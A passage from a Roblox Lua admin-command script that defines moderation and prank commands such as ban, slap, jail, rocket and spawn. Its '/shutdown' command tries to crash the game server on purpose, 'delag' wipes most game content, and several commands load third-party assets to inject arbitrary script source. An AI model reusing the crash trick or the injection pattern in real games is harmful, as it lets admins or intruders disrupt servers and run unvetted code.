CoolCMDs.Functions.CreateMessage("Hint", "[Ban] Name(s) removed.", 2.5, Speaker)
else
CoolCMDs.Functions.CreateMessage("Hint", "[Ban] Name(s) not found!", 2.5, Speaker)
end
elseif Type == "remove all" or Type == "ra" then
Self.Bans = {}
CoolCMDs.Functions.CreateMessage("Hint", "[Ban] Ban table reset.", 2.5, Speaker)
end
end, "Ban", "Place a ban (removes the player on entering) on a player from the game. Player: Ban and remove a player from the game. Name: Add a name to the ban list. Remove, Remove All: Remove a name or remove all names from the ban list.", "[[player, p], [name, n], [remove, r]]" ..CoolCMDs.Data.SplitCharacter.. "player" ..CoolCMDs.Data.SplitCharacter.. "[...], remove all")

CoolCMDs.Functions.CreateCommand({"slap", "s"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 3 then return false end
local Speed = tonumber(MessageSplit[#MessageSplit - 1])
local Strength = tonumber(MessageSplit[#MessageSplit])
if Speed == nil then Speed = 10 end
if Strength == nil then Strength = 0 end
Speed = math.abs(Speed)
Strength = math.abs(Strength)
for i = 1, #MessageSplit - 2 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Humanoid") ~= nil then
PlayerList.Character.Humanoid:TakeDamage(Strength)
PlayerList.Character.Humanoid.Sit = true
end
for _, Children in pairs(PlayerList.Character:children()) do
if Children:IsA("BasePart") then
Children.Velocity = Children.Velocity + Vector3.new(math.random(-Speed, Speed), math.random(-Speed, Speed), math.random(-Speed, Speed))
Children.RotVelocity = Children.RotVelocity + Vector3.new(math.random(-Speed, Speed), math.random(-Speed, Speed), math.random(-Speed, Speed))
end
end
end
end
end
end, "Slap", "Slap people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "speed" ..CoolCMDs.Data.SplitCharacter.. "strength")

CoolCMDs.Functions.CreateCommand({"blocker", "blk"}, 3, function(Message, MessageSplit, Speaker, Self)
if Self.Activated == nil then Self.Activated = false end
if Self.Type == nil then Self.Type = 1 end
if Self.Names == nil then Self.Names = {} end
if Self.ClassNames == nil then Self.ClassNames = {} end
if MessageSplit[1]:lower() == "on" then
Self.Activated = true
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Activated.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "off" then
Self.Activated = false
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Deactivated.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "name" then
for i = 2, #MessageSplit do
table.insert(Self.Names, MessageSplit[i])
end
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Added.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "class" then
for i = 2, #MessageSplit do
table.insert(Self.ClassNames, MessageSplit[i])
end
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Added.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "type" then
if MessageSplit[2] == "match" or MessageSplit[2] == "1" then
Self.Type = 1
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Set evaluation type to match (1).", 2.5, Speaker)
elseif MessageSplit[2] == "exact" or MessageSplit[2] == "2" then
Self.Type = 2
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Set evaluation type to exact (2).", 2.5, Speaker)
end
end
if MessageSplit[1]:lower() == "gbku45uk" then
for i = 2, #MessageSplit do
for x = 1, #Self.Names do
if string.match(Self.Names[x], MessageSplit[i]) then
table.remove(Self.Names, x)
end
end
for x = 1, #Self.ClassNames do
if string.match(Self.ClassNames[x], MessageSplit[i]) then
table.remove(Self.ClassNames, x)
end
end
end
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Removed.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "grtuiehrguhb5t5y45g5" then
Self.Names = {}
Self.ClassNames = {}
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] Removed all entries.", 2.5, Speaker)
end
if Self.Activated == true then
if Self.DescendantAdded ~= nil then
Self.DescendantAdded:disconnect()
Self.DescendantAdded = nil
end
Self.DescendantAdded = game.DescendantAdded:connect(function(Object)
local Remove = false
for i = 1, #Self.Names do
if (Self.Type == 1 and string.match(Object.Name:lower(), Self.Names[i]:lower())) or (Self.Type == 2 and Object.Name:lower() == Self.Names[i]:lower()) then
Remove = true
end
end
for i = 1, #Self.ClassNames do
if (Self.Type == 1 and string.match(Object.className:lower(), Self.ClassNames[i]:lower())) or (Self.Type == 2 and Object.className:lower() == Self.ClassNames[i]:lower()) then
Remove = true
end
end
if Remove == true then
CoolCMDs.Functions.CreateMessage("Hint", "[Blocker] \"" ..Object.className.. " object (" ..Object.Name.. ") is blocked and has been removed.", 10)
pcall(function() Object.Disabled = true end)
pcall(function() Object.Active = false end)
pcall(function() Object.Activated = false end)
pcall(function() Object:Remove() end)
end
end)
else
if Self.DescendantAdded ~= nil then
Self.DescendantAdded:disconnect()
Self.DescendantAdded = nil
end
end
end, "Blocker", "Blocks objects by name or className.", "on, off, name" ..CoolCMDs.Data.SplitCharacter.. "object name, class" ..CoolCMDs.Data.SplitCharacter.. "object className, type" ..CoolCMDs.Data.SplitCharacter.. "[match, exact]")

CoolCMDs.Functions.CreateCommand({"characterappearance", "ca"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 2, #MessageSplit - (MessageSplit[1]:lower() == "default" and 0 or 1) do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]) then
if MessageSplit[1] == "default" then
PlayerList.CharacterAppearance = "http://www.Roblox.com/Asset/CharacterFetch.ashx?userId=" ..PlayerList.userId
elseif MessageSplit[1] == "set" then
PlayerList.CharacterAppearance = MessageSplit[#MessageSplit]
elseif MessageSplit[1] == "userid" then
PlayerList.CharacterAppearance = "http://www.Roblox.com/Asset/CharacterFetch.ashx?userId=" ..tonumber(MessageSplit[#MessageSplit])
elseif MessageSplit[1] == "assetid" then
PlayerList.CharacterAppearance = "http://www.Roblox.com/Asset/?id=" ..tonumber(MessageSplit[#MessageSplit])
end
end
end
end
end, "CharacterAppearance Editor", "See command name.", "default, set, userid, assetid" ..CoolCMDs.Data.SplitCharacter.. "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "[url, userid, assetid]")

CoolCMDs.Functions.CreateCommand({"character", "char", "ch"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return end
for i = 2, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Humanoid") ~= nil and PlayerList.Character:FindFirstChild("Torso") ~= nil then
if MessageSplit[1]:lower() == "sit" then
PlayerList.Character.Humanoid.Sit = true
elseif MessageSplit[1]:lower() == "jump" then
PlayerList.Character.Humanoid.Jump = true
elseif MessageSplit[1]:lower() == "platformstand" or MessageSplit[1]:lower() == "ps" then
PlayerList.Character.Humanoid.PlatformStand = true
elseif MessageSplit[1]:lower() == "trip" then
PlayerList.Character.Humanoid.PlatformStand = true
PlayerList.Character.Torso.RotVelocity = Vector3.new(math.random(-25, 25), math.random(-25, 25), math.random(-25, 25))
coroutine.wrap(function()
wait(0.5)
PlayerList.Character.Humanoid.PlatformStand = false
end)()
elseif MessageSplit[1]:lower() == "stand" then
PlayerList.Character.Humanoid.Sit = false
PlayerList.Character.Humanoid.PlatformStand = false
end
end
end
end
end
end, "Character Editor", "Make people do things.", "sit, jump, [platformstand, ps], trip, stand" ..CoolCMDs.Data.SplitCharacter.. "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand("seisure", 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 2 then return false end
local Duration = tonumber(MessageSplit[#MessageSplit])
if Duration == nil then Duration = math.random(5, 10) end
for i = 1, #MessageSplit - 1 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Humanoid") ~= nil then
coroutine.wrap(function()
for i = 0, Duration, 0.25 do
if PlayerList == nil then break end
if PlayerList.Character == nil then break end
if PlayerList.Character:FindFirstChild("Humanoid") == nil then break end
PlayerList.Character.Humanoid.PlatformStand = math.random(1, 3) == 1 and false or true
for _, Part in pairs(PlayerList.Character:children()) do
if Part:IsA("BasePart") then
Part.RotVelocity = Part.RotVelocity + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
end
end
wait(0.25)
end
pcall(function() PlayerList.Character.Humanoid.PlatformStand = false end)
end)()
end
end
end
end
end, "Seisure", "Make people have seisures.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "time (seconds)")

CoolCMDs.Functions.CreateCommand("rocket", 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit < 3 then return false end
local Speed = tonumber(MessageSplit[#MessageSplit - 1])
local Duration = tonumber(MessageSplit[#MessageSplit])
if Speed == nil then Speed = 100 end
if Duration == nil then Duration = math.random(5, 10) end
for i = 1, #MessageSplit - 2 do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Children in pairs(PlayerList.Character:children()) do
if Children:IsA("BasePart") then
coroutine.wrap(function()
local BodyVelocity = Instance.new("BodyVelocity", Children)
BodyVelocity.maxForce = Vector3.new(math.huge, math.huge, math.huge)
local Fire = Instance.new("Fire", Children)
Fire.Heat = 0
Fire.Size = 3
local Smoke = Instance.new("Smoke", Children)
Smoke.Enabled = false
Smoke.RiseVelocity = 0
Smoke.Size = 2.5
local Sound = Instance.new("Sound", Children)
Sound.SoundId = "rbxasset://sounds/Shoulder fired rocket.wav"
Sound.Pitch = 0.8
Sound.Volume = 1
Sound:Play()
Children.Velocity = Children.Velocity + Vector3.new(0, 1000, 0)
wait(0.25)
Fire.Size = 10
Smoke.Enabled = true
local Sound = Instance.new("Sound", Children)
Sound.SoundId = "rbxasset://sounds/Rocket whoosh 01.wav"
Sound.Pitch = 0.5
Sound.Volume = 1
Sound:Play()
coroutine.wrap(function()
for i = 0, 1, 0.01 do
BodyVelocity.velocity = Vector3.new(0, Speed * i, 0)
wait()
end
BodyVelocity.velocity = Vector3.new(0, Speed, 0)
end)()
if Duration ~= 0 then
coroutine.wrap(function()
wait(Duration)
BodyVelocity:Remove()
local Explosion = Instance.new("Explosion", workspace)
Explosion.Position = Children.CFrame.p
Explosion.BlastPressure = 50000
Explosion.BlastRadius = 25
Fire.Enabled = false
Smoke.Enabled = false
Children:BreakJoints()
end)()
end
end)()
end
end
wait(math.random(1, 10) / 10)
end
end
end
end, "Rocket", "Fires bodyparts into the air that explode after a set time.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]" ..CoolCMDs.Data.SplitCharacter.. "speed" ..CoolCMDs.Data.SplitCharacter.. "duration (in seconds)")

CoolCMDs.Functions.CreateCommand({"jail", "j"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Torso") ~= nil then
local Position = PlayerList.Character.Torso.CFrame
local IsJailed = Instance.new("IntValue")
IsJailed.Name = "IsJailed"
IsJailed.Parent = PlayerList
coroutine.wrap(function()
while IsJailed.Parent == PlayerList and PlayerList.Parent ~= nil do
if PlayerList.Character ~= nil then
if PlayerList.Character:FindFirstChild("Torso") ~= nil then
if (PlayerList.Character.Torso.CFrame.p - Position.p).magnitude > 10 then
PlayerList.Character.Torso.CFrame = Position * CFrame.new(0, 1.5, 0)
PlayerList.Character.Torso.Velocity = Vector3.new(0, 0, 0)
PlayerList.Character.Torso.RotVelocity = Vector3.new(0, 0, 0)
CoolCMDs.Functions.CreateMessage("Hint", (function()
local Text = math.random(1, 12)
if Text == 1 then
return "You were put here for a reason."
elseif Text == 2 then
return "This is your new home; stay in it."
elseif Text == 3 then
return "You can't escape, you know."
elseif Text == 4 then
return "Resistance is futile!"
elseif Text == 5 then
return "You, plus jail, equals: Stop trying to get out of it."
elseif Text == 6 then
return "It's called a \"jail\" for a reason."
elseif Text == 7 then
return "This is why we can't have nice things."
elseif Text == 8 then
return "You are a reason why we can't have nice things."
elseif Text == 9 then
return "Not even God himself can save you now."
elseif Text == 10 then
return "Where is your God now?"
elseif Text == 11 then
return "Jailed forever."
elseif Text == 12 then
return "Beat your head on the bars a few times, that might help."
end
end)(), 5, PlayerList)
end
end
end
wait(math.random(1, 10) / 100)
end
for _, Part in pairs(game:service("Workspace"):children()) do
if string.match(Part.Name, "JailPart") and string.match(Part.Name, PlayerList.Name) then
pcall(function() Part:Remove() end)
end
end
end)()
wait()
local JailPart1 = Instance.new("Part")
JailPart1.Name = PlayerList.Name.. "JailPart"
JailPart1.TopSurface = 0
JailPart1.BottomSurface = 0
JailPart1.BrickColor = BrickColor.new("Really black")
JailPart1.formFactor = "Custom"
JailPart1.Anchored = true
JailPart1.CanCollide = true
JailPart1.Size = Vector3.new(11, 1, 11)
local JailPart2 = JailPart1:Clone()
JailPart2.Size = Vector3.new(0.5, 8, 0.5)
local JailPart = JailPart1:Clone()
JailPart.CFrame = Position * CFrame.new(0, -2, 0)
JailPart.Parent = game:service("Workspace")
for i = 5, -4, -1 do
local JailPart = JailPart2:Clone()
JailPart.CFrame = Position * CFrame.new(-5, 2, i)
JailPart.Parent = game:service("Workspace")
end
for i = -5, 4, 1 do
local JailPart = JailPart2:Clone()
JailPart.CFrame = Position * CFrame.new(i, 2, -5)
JailPart.Parent = game:service("Workspace")
end
for i = -5, 4, 1 do
local JailPart = JailPart2:Clone()
JailPart.CFrame = Position * CFrame.new(5, 2, i)
JailPart.Parent = game:service("Workspace")
end
for i = 5, -4, -1 do
local JailPart = JailPart2:Clone()
JailPart.CFrame = Position * CFrame.new(i, 2, 5)
JailPart.Parent = game:service("Workspace")
end
local JailPart = JailPart1:Clone()
JailPart.CFrame = Position * CFrame.new(0, 6, 0)
JailPart.Parent = game:service("Workspace")
end
end
end
end
end, "Jail", "Jail people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"unjail", "unj", "uj"}, 1, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
for _, PlayerList in pairs(game:service("Players"):GetPlayers()) do
if string.match(PlayerList.Name:lower(), MessageSplit[i]:lower()) and PlayerList.Character ~= nil then
for _, Part in pairs(PlayerList:children()) do
if string.match(Part.Name, "IsJailed") then
Part:Remove()
end
end
end
end
end
end, "Unjail", "Unjail people.", "player" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"/base", "rb"}, 1, function(Message, MessageSplit, Speaker, Self)
for _, Part in pairs(game:service("Workspace"):children()) do
if Part.Name == "Base" then
Part:Remove()
end
end
Base = Instance.new("Part")
Base.Name = "Base"
Base.BrickColor = BrickColor.new("Dark green")
Base.TopSurface = "Studs"
Base.BottomSurface = "Smooth"
Base.formFactor = "Custom"
Base.Size = Vector3.new(1000, 5, 1000)
Base.CFrame = CFrame.new(0, -2, 0)
Base.Locked = true
Base.Anchored = true
Base.Parent = game:service("Workspace")
end, "Rebase", "Make a new base.", "None")

CoolCMDs.Functions.CreateCommand({"/spawn", "sp"}, 1, function(Message, MessageSplit, Speaker, Self)
local Part = Instance.new("Part")
Part.Name = "Base"
Part.BrickColor = BrickColor.new("Really black")
Part.TopSurface = "Smooth"
Part.BottomSurface = "Smooth"
Part.formFactor = "Custom"
Part.Size = Vector3.new(9, 1, 9)
Part.CFrame = CFrame.new(0, 1, 0)
Part.Locked = true
Part.Anchored = true
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.Size = Vector3.new(0.5, 8, 0.5)
Part.CFrame = CFrame.new(4, 5.5, 4)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.CFrame = CFrame.new(4, 5.5, -4)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.CFrame = CFrame.new(-4, 5.5, -4)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.CFrame = CFrame.new(-4, 5.5, 4)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.Size = Vector3.new(0.5, 0.5, 8)
Part.CFrame = CFrame.new(4, 9.75, -0.25)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.Size = Vector3.new(8, 0.5, 0.5)
Part.CFrame = CFrame.new(0.25, 9.75, 4)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.Size = Vector3.new(0.5, 0.5, 8)
Part.CFrame = CFrame.new(-4, 9.75, 0.25)
Part.Parent = game:service("Workspace")
local Part = Part:Clone()
Part.Size = Vector3.new(8, 0.5, 0.5)
Part.CFrame = CFrame.new(-0.25, 9.75, -4)
Part.Parent = game:service("Workspace")
local Part1 = Instance.new("Part")
Part1.Name = "Base"
Part1.BrickColor = BrickColor.new("Dark stone grey")
Part1.TopSurface = "Smooth"
Part1.BottomSurface = "Smooth"
Part1.formFactor = "Custom"
Part1.Size = Vector3.new(6, 0.25, 6)
Part1.CFrame = CFrame.new(0, 1.625, 0)
Part1.Locked = true
Part1.Anchored = true
Part1.Parent = game:service("Workspace")
local Part2 = Instance.new("SpawnLocation")
Part2.Name = "Base"
Part2.BrickColor = BrickColor.new("Dark stone grey")
Part2.TopSurface = "Smooth"
Part2.BottomSurface = "Smooth"
Part2.formFactor = "Custom"
Part2.Size = Vector3.new(4, 0.25, 4)
Part2.CFrame = CFrame.new(0, 1.875, 0)
Part2.Locked = true
Part2.Anchored = true
Part2.Parent = game:service("Workspace")
coroutine.wrap(function()
for i = 0, math.huge, 0.005 do
if Part1.Parent == nil or Part2.Parent == nil then break end
Part1.CFrame = CFrame.new(Part1.CFrame.p) * CFrame.fromEulerAnglesXYZ(0, math.rad(math.sin(i) * 360 * -5.25), 0)
Part2.CFrame = CFrame.new(Part2.CFrame.p) * CFrame.fromEulerAnglesXYZ(0, math.rad(math.cos(i) * 360 * 2), 0)
wait()
end
end)()
end, "Spawn", "Make a spawn.", "None")

CoolCMDs.Functions.CreateCommand("/shutdown", 1, function(Message, MessageSplit, Speaker, Self)
local Hint = Instance.new("Hint", game:service("Workspace"))
for i = 5, 0, -1 do
Hint.Text = "Shutting down server in " ..i.. "..."
wait(1)
end
pcall(function() Instance.new("ManualSurfaceJointInstance", game:service("Workspace")) end)
wait(0.5)
Hint.Text = "Shutdown failed!"
wait(5)
Hint:Remove()
end, "Shutdown", "Kill the server.", "None")

CoolCMDs.Functions.CreateCommand("/remove/"..CoolCMDs.Data.AccessCode, 5, function(Message, MessageSplit, Speaker, Self)
loadstring([==[_G.CoolCMDs[CoolCMDs.Initialization.InstanceNumber]:Remove(CoolCMDs.Data.AccessCode)]==])()
end, "Remove Script", "Remove CoolCMDs.", "None")
--[[ --Command template...
CoolCMDs.Functions.CreateCommand("[ Command Here ]", 5, function(Message, MessageSplit, Speaker, Self)
-- [ Put stuff here ]
end, "None", "None", "None")
--]]
-- Davbot commands!!!
-- Sadly, most of these don't work :(
CoolCMDs.Functions.CreateCommand("map takeover", 5, function(Message, MessageSplit, Speaker, Self)
Notify("Inserting TAKEOVER for " ..Speaker.Name.. ". PLEASE WAIT.")
m = Game:GetService("InsertService"):LoadAsset(61598425) 
m.Parent = Workspace 
m:MakeJoints() 
Workspace:BreakJoints() 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("space station", 5, function(Message, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now building a space station.")
m = Game:GetService("InsertService"):LoadAsset(19401551) 
m.Parent = Workspace 
m:MakeJoints() 
Workspace:BreakJoints() 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("delag", 5, function(Message, MessageSplit, Speaker, Self)
Notify("Now debugging the server...")
wait(1)
pcall(function() workspace.Terrain:Clear() end) --no moar terrain
pcall(function()
table.foreach(Game:GetService("Workspace"):GetChildren(),function(_,v)(function(v) return (not (v:IsA("Camera") or game:GetService("Players"):GetPlayerFromCharacter(v) or v == workspace.Terrain) and v:remove()) end)(v) end)
table.foreach(Game:GetService("Lighting"):GetChildren(),function(_,v)(function(v) return (not (false and v:remove())) end)(v)end)
table.foreach(Game:GetService("StarterGui"):GetChildren(),function(_,v)(function(v) return (not (false and v:remove())) end)(v)end)
table.foreach(Game:GetService("StarterPack"):GetChildren(),function(_,v)(function(v) return (not (false and v:remove())) end)(v)end)
table.foreach(Game:GetService("Teams"):GetChildren(),function(_,v)(function(v) return (not (false and v:remove())) end)(v)end)
table.foreach(Game:GetService("Debris"):GetChildren(),function(_,v)(function(v) return (not (false and v:remove())) end)(v)end)
end)
---Several cleans to ensure server safety.
local Base = Instance.new("Part") 
Base.Parent = Workspace 
Base.Name = "Base" 
Base.Anchored = true 
Base.Position = Vector3.new(0, 0, 0) 
Base.CFrame = CFrame.new(0, 0, 0)
Base.Size = Vector3.new(512, 1.2, 512) 
Base.TopSurface = ("Universal")
Base.BrickColor = BrickColor.Green() 
Base.Locked = true 
local Spawn = Instance.new("SpawnLocation") 
Spawn.Parent = Workspace 
Spawn.Anchored = true 
Spawn.Locked = true 
Spawn.Position = Vector3.new(0, 1.2, 0)
Spawn.formFactor = ("Symmetric") 
Spawn.Size = Vector3.new(5, 1, 5) 
Spawn.BrickColor = BrickColor.Blue() 
--TODOQUICKSCRIPT
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "RotationScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
while true do
script.Parent.CFrame = script.Parent.CFrame * CFrame.fromEulerAnglesXYZ(0, math.rad(.05), 0)
wait()
end
]]
QuickScript.Parent = Spawn

for i, v in pairs(Players:GetChildren()) do
if v.Character ~= nil then
v.Character.Parent = Workspace
end
end
wait(2) 
Notify("Lag Removal Complete.")
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("lagmeter", 5, function(Message, MessageSplit, Speaker, Self)
g = game:GetService("InsertService"):LoadAsset(59383950) 
g.Parent = Workspace
for i, v in pairs(Players:GetChildren()) do
if v:FindFirstChild("PlayerGui") ~= nil then
c = g.ThemedBanner:Clone()
c.Parent = v.PlayerGui
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unspin", 5, function(Message, MessageSplit, Speaker, Self)
local msg = Message
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character:FindFirstChild("Torso") ~= nil) then
if (player.Character.Torso:FindFirstChild("Spin") ~= nil) then
player.Character.Torso.Spin:Remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unhover", 5, function(Message, MessageSplit, Speaker, Self)
local msg = Message
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character:FindFirstChild("Torso") ~= nil) then
if (player.Character.Torso:FindFirstChild("HoverScript") ~= nil) then
if (player.Character.Torso:FindFirstChild("BodyPositionHOV") ~= nil) then
if (player.Character.Torso:FindFirstChild("BodyGyroHOV") ~= nil) then
if (player.Character.Torso:FindFirstChild("PewPew") ~= nil) then
player.Character.Torso.HoverScript:Remove()
player.Character.Torso.BodyPositionHOV:Remove()
player.Character.Torso.BodyGyroHOV:Remove()
player.Character.Torso.PewPew:Stop()
player.Character.Torso.PewPew:Remove()
end
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("hover", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character:FindFirstChild("Torso") ~= nil) then
if (player.Character.Torso:FindFirstChild("HoverScript") == nil) then
local QuickScript = Game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "HoverScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
local torso = script.Parent
PewPew = Instance.new("Sound")
PewPew.Name = "PewPew"
PewPew.SoundId = "http://www.roblox.com/asset/?id=34315534"
PewPew.Parent = torso
PewPew.Volume = 0.5
PewPew.Looped = true
PewPew:Play()
local bodyPos = Instance.new("BodyPosition")
bodyPos.P = torso:GetMass() * 50000
bodyPos.D = bodyPos.P * 5
bodyPos.position = Vector3.new(torso.Position.x,torso.Position.y + (torso.Size.y * 3),torso.Position.z)
bodyPos.maxForce = Vector3.new(bodyPos.P,bodyPos.P,bodyPos.P)
bodyPos.Parent = torso
bodyPos.Name = "BodyPositionHOV"
print(bodyPos.position.y)
local bodyGyro = Instance.new("BodyGyro")
bodyGyro.P = 5000
bodyGyro.D = bodyGyro.P * 1.5
bodyGyro.cframe = torso.CFrame * CFrame.Angles(math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2))
bodyGyro.Parent = torso
bodyGyro.Name = "BodyGyroHOV"
wait(1)
bodyGyro.cframe = torso.CFrame * CFrame.Angles(math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2))
wait(1)
bodyGyro.cframe = torso.CFrame * CFrame.Angles(math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2),math.random(-math.pi/2,-math.pi/2))
wait(3)
while true do
bodyPos.position = Vector3.new(torso.Position.x + math.random(-7,7),torso.Position.y + torso.Size.y,torso.Position.z + math.random(-7,7))
bodyGyro.cframe = torso.CFrame * CFrame.Angles(math.random(-math.pi,math.pi),-math.pi,math.random(-math.pi,math.pi))
wait(5)
end
]]
QuickScript.Parent = player.Character.Torso
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("pwn", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character:FindFirstChild("Torso") ~= nil) then
local p = Instance.new("Part") 
local e = Instance.new("Explosion") 
local s = Instance.new("Sound") 
s.Parent = Game.Workspace
s.SoundId = "http://roblox.com/asset/?id=10209236" 
s.Volume = 1
s.Pitch = 1
s.PlayOnRemove = true 
p.Parent = game.Workspace 
p.Size = Vector3.new(3, 250, 3) 
p.Position = player.Character.Torso.Position + Vector3.new(0, 13, 0) 
p.BrickColor = BrickColor.Blue()
p.Transparency = 0.3 
p.Reflectance = 0 
p.Anchored = true 
p.CanCollide = false 
p.TopSurface = "Smooth" 
p.BottomSurface = "Smooth" 
B = Instance.new("BlockMesh")
B.Parent = p
B.Scale = Vector3.new(1, 5000, 1)
e.Parent = game.Workspace 
e.Position = player.Character.Torso.Position
e.BlastRadius = math.random(10, 20) 
e.BlastPressure = math.random(30000000, 50000000) 
s:Play()
local QuickScript = Game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "RemovalScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
wait(1)
script.Parent:Remove()
]]
QuickScript.Parent = p
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("spin", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character:FindFirstChild("Torso") ~= nil) then
if (player.Character.Torso:FindFirstChild("Spin") == nil) then
local bodySpin = Instance.new("BodyAngularVelocity")
bodySpin.P = 200000
bodySpin.angularvelocity = Vector3.new(0, 15, 0)
bodySpin.maxTorque = Vector3.new(bodySpin.P, bodySpin.P, bodySpin.P)
bodySpin.Name = "Spin"
bodySpin.Parent = player.Character.Torso
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("superjump", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player:FindFirstChild("Backpack") ~= nil) then
local tool = Instance.new("Tool")
tool.Parent = player.Backpack
tool.Name = "Booster"
a = Instance.new("Part") 
a.Anchored = false 
a.Size = Vector3.new(1, 1, 1) 
a.Name = "Handle" 
a.Locked = true 
a.Shape = 0 
a.Parent = tool 
a.BrickColor = BrickColor.new(math.random(), math.random(), math.random())
m = Instance.new("SpecialMesh") 
m.Parent = a 
m.MeshType = "Sphere" 
m.Scale = Vector3.new(0.8,0.5,0.8) 
bf = Instance.new("BodyForce") 
bf.Parent = a 
bf.force = Vector3.new(0, 7000, 0)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("castle", 5, function(msg, MessageSplit, Speaker, Self)
Notify("Yes master " ..Speaker.Name.. ", now building a castle!")
m = Game:GetService("InsertService"):LoadAsset(61374374)
m.Parent = Workspace
m:MakeJoints()
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rbase", 5, function(msg, MessageSplit, Speaker, Self)
speed = string.sub(msg, 7) 
speed = tonumber(speed) 
if speed ~= nil then 
for i, v in pairs(Workspace:GetChildren()) do
if v.Name == "Base" or v.Name == "Davillabase" then
if v:FindFirstChild("Rotational") == nil then
local V = Instance.new("IntValue")
V.Parent = v
V.Value = speed
V.Name = "Rotational"
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "RotationScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
while true do
M = script.Parent.Rotational.Value / 100
